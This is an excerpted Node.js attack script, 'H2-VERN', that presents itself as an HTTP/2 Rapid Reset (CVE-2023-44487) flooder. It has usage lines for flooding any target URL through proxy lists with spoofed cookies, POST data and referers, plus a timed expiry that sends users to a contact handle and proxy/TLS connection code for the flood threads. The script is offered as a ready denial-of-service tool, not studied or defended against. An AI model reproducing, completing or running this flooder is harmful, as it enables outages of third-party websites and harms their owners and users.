...
const targetDate = new Date('2235-12-31');
...
VERN v2.0 Method With RST STREAM (CVE-2023-44487)
How to use & example:
  node h2-vern.js <target> <time> <ratelimit> <thread> <proxy> <cookie>
  node h2-vern.js https://target.com/ 120 64 5 proxy.txt jawa=jawa --flood --delaytime 1 --cookie "f=f" --querystring 1 --botfmode true --postdata "user=f&pass=%RAND%" --referers rand
...
if (currentDate > targetDate) {
    console.error('Error method has been outdate pm @spoofinggeed');
    process.exit(1);
}
...
function _log(x) {
    console.log("[" + "H2-VERN".red.bold + "] " + x);
}
...
for (let i = 0; i < (isFull ? rate : 1); i++) {
    function runFlooder() {
        ...
        const vport = parseInt(parsedProxy[1], 10); // Convert to integer

        // Validate port number
        if (vport < 0 || vport >= 65536) {
            throw new Error(`Invalid port number: ${vport}`);
        }
        ...
        Socker.HTTP(proxyOptions, (connection, error) => {
            ...
            const tlsOptions = {
                port: parsedPort,
                ALPNProtocols: ["h2", "http/1.0", "http/1.1"],
                agent,
                secure: true,
                ciphers: ciphers,
                sigalgs: sigalgs,
...
if (cluster.isMaster) {
    ...
    console.log(`H2-VERN Best methods`);
